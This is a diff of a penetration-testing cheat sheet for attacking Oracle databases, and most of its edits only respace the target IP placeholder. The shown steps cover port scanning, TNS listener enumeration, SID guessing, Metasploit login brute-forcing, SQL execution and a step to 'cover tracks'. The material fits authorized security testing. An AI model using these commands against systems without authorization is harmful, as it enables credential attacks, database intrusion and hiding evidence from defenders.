@@ -10,15 +10,15 @@ Oracle
 7. Cover tracks.
 ------------------------------------------------------------------------------------------------------
 
-1. nmap -Pn -n -T4 --open -p1521 <targetIP>
+1. nmap -Pn -n -T4 --open -p1521 <target IP>
 
 2. Example 1
      msf > use auxiliary/scanner/oracle/tnslsnr_version
      db_notes
      
    Example 2
-     tnscmd10g version -h <targetIP>
-     tnscmd10g status -h <targetIP>
+     tnscmd10g version -h <target IP>
+     tnscmd10g status -h <target IP>
      Look for the version, LOGFILE, TRACING and PORT.
    
 3. Example 1
@@ -29,14 +29,14 @@ Oracle
      sidguess host=<targetIP> port=1521 sidfile=file.txt   
 
    Example 3
-     http://<targetIP>:8080/oradb/PUBLIC/GLOBAL_NAME
+     http://<target IP>:8080/oradb/PUBLIC/GLOBAL_NAME
 
 4. Example 1
      msf > use auxiliary/admin/oracle/login_brute
      set SID <sid>
      
    Example 2 
-     sqlplus <username>/<password>@<targetIP>:<port>/<SID>
+     sqlplus <username>/<password>@<target IP>:<port>/<SID>
 
 5. msf > use auxiliary/admin/oracle/sql
    set DBUSER <user>
